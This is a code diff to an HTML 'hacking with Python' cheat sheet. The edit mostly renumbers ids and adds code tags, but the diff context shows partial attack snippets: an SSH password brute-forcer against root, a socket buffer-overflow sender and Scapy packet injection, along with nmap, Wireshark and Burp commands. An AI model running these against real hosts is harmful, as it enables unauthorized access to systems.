@@ -543,7 +543,6 @@ Python is widely recognized for its <b>simplicity and versility</b>, and it has 
     <hr>
     <div class="container">
    <div class="section">
-        <h2>Introduction to Hacking</h2>
         <p>Hacking is the act of identifying and exploiting weaknesses in computer systems and networks to gain unauthorized access. It involves creative problem-solving, technical knowledge, and a keen understanding of computer systems and vulnerabilities.</p>
     </div>
 
@@ -572,8 +571,9 @@ Python is widely recognized for its <b>simplicity and versility</b>, and it has 
 
     <div class="cheat-sheet">
         <h2>Example: Using Requests for Web Scraping</h2>
-        <div class="command" id="code1">
+        <div class="command" id="code10">
             <pre>
+               <code id="code10">
 import requests
 
 def check_vulnerability(url):
@@ -592,6 +592,7 @@ def check_vulnerability(url):
 # Test the script with a target URL
 check_vulnerability("http://example.com")
             </pre>
+          </code>
             <button onclick="copyToClipboard('code10')">Copy</button>
         </div>
     </div>
@@ -604,8 +605,9 @@ check_vulnerability("http://example.com")
 
     <div class="command">
         <h2>Example: Python Brute Force SSH Login</h2>
-        <div class="code-snippet" id="code2">
+        <div class="code-snippet" id="code11"> 
             <pre>
+              <code id="code11">
 import paramiko
 
 def brute_force_ssh(host, username, password_list):
@@ -624,6 +626,7 @@ def brute_force_ssh(host, username, password_list):
 passwords = ["password123", "admin", "letmein", "123456"]
 brute_force_ssh('192.168.1.2', 'root', passwords)
             </pre>
+          </code>
             <button onclick="copyToClipboard('code11')">Copy</button>
         </div>
     </div>
@@ -636,8 +639,9 @@ brute_force_ssh('192.168.1.2', 'root', passwords)
 
     <div class="cheat-sheet">
         <h2>Example: Python Buffer Overflow Exploit (Basic)</h2>
-        <div class="command" id="code3">
+        <div class="command" id="code12">
             <pre>
+              <code id="code12">
 import socket
 
 def buffer_overflow_exploit(target_ip, target_port, payload):
@@ -655,6 +659,7 @@ def buffer_overflow_exploit(target_ip, target_port, payload):
 # Example of a simple buffer overflow exploit (replace with actual vulnerable target)
 payload = b"A" * 1024  # Example of an overflow payload
 buffer_overflow_exploit('192.168.1.2', 12345, payload)
+              </code>
             </pre>
             <button onclick="copyToClipboard('code12')">Copy</button>
         </div>
@@ -667,8 +672,9 @@ buffer_overflow_exploit('192.168.1.2', 12345, payload)
 
     <div class="cheat-sheet">
         <h2>Example: Python Packet Injection with Scapy</h2>
-        <div class="command" id="code4">
+        <div class="command" id="code13">
             <pre>
+              <code id="code13">
 from scapy.all import IP, ICMP, send
 
 def packet_injection(target_ip):
@@ -702,10 +708,12 @@ packet_injection("192.168.1.2")
     <div class="cheat-sheet">
         <h2>Example: Using Nmap for Network Scanning</h2>
         <p>Here is an example of how to use Nmap for scanning open ports and detecting services on a remote host.</p>
-        <div class="command" id="code7">
+        <div class="command" id="code14">
             <pre>
+              <code id="code14">
 # Example Nmap command for scanning a target host
 nmap -sS -p 1-65535 -T4 target_ip
+              </code>
             </pre>
             <button onclick="copyToClipboard('code14')">Copy</button>
         </div>
@@ -714,10 +722,12 @@ nmap -sS -p 1-65535 -T4 target_ip
     <div class="cheat-sheet">
         <h2>Example: Using Wireshark for Packet Sniffing</h2>
         <p>Wireshark is a tool used to capture and inspect network packets. While it is a GUI-based tool, you can use it to analyze network traffic and detect vulnerabilities in a network.</p>
-        <div class="command" id="code8">
+        <div class="command" id="code15">
             <pre>
+              <code id="code15">
 # Wireshark capture command (run Wireshark with appropriate permissions)
 wireshark -k -Y "http.request" -i eth0
+              </code>
             </pre>
             <button onclick="copyToClipboard('code15')">Copy</button>
         </div>
@@ -726,10 +736,12 @@ wireshark -k -Y "http.request" -i eth0
     <div class="cheat-sheet">
         <h2>Example: Using Burp Suite for Intercepting HTTP Requests</h2>
         <p>Burp Suite allows for intercepting and manipulating HTTP/S requests between your browser and the target application. You can modify requests and responses, brute force login forms, and more.</p>
-        <div class="command" id="code9">
+        <div class="command" id="code16">
             <pre>
+              <code id="code16">
 # Burp Suite command to start the proxy (requires Burp Suite installation)
 java -jar burpsuite_pro_vX.X.X.jar
+              </code>
             </pre>
             <button onclick="copyToClipboard('code16')">Copy</button>
         </div>
